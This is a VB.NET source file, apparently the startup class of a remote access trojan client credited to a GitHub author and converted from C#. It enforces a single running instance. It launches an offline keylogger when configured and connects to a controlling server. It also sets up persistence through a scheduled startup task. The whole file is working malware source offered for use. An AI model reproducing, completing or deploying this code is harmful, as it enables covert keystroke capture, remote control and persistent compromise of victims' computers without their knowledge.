Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Threading

' 
'|| AUTHOR Arsium ||
'|| github : https://github.com/arsium       ||
'|| Converted from C# code with Tangible Source Code Converters 2022.01 ||
'

Namespace Client
    Public Class StarterClass

        Friend Shared KeylogOn As Boolean
        Private Shared AlreadyLaunched As Boolean = False
        Private Shared mutex As Mutex
        Public Shared Sub OneInstance()
            mutex = New Mutex(True, Config.mutex, AlreadyLaunched)
            If Not AlreadyLaunched Then
                NtTerminateProcess(Process.GetCurrentProcess().Handle, 0)
            End If
        End Sub


        Shared Sub New()
            KeylogOn = False
            clientHandler = New ClientHandler()
            StartOfflineKeylogger()
        End Sub

        Friend Shared Sub StartOfflineKeylogger()
            If Not StarterClass.KeylogOn And Config.offKeylog <> "False" Then
                Plugin.Launch.Start()
                KeylogOn = True
            End If
        End Sub


        <DllImport("ntdll.dll")>
        Friend Shared Function NtTerminateProcess(ByVal hProcess As IntPtr, ByVal errorStatus As Integer) As UInteger
        End Function

        Friend Shared clientHandler As ClientHandler

        <MTAThread>
        Public Shared Sub Main()
            OneInstance()
            clientHandler.ConnectStart()
            MakeInstall()
            Call (New Thread(New ThreadStart(Sub()
                                                 Do
                                                     Thread.Sleep(-1)
                                                 Loop
                                             End Sub))).Start()
        End Sub

        Public Shared Sub MakeInstall()
            Persistence.TaskScheduler.StartUpTaskScheduler(Config.time, Config.taskName)
        End Sub
    End Class
End Namespace
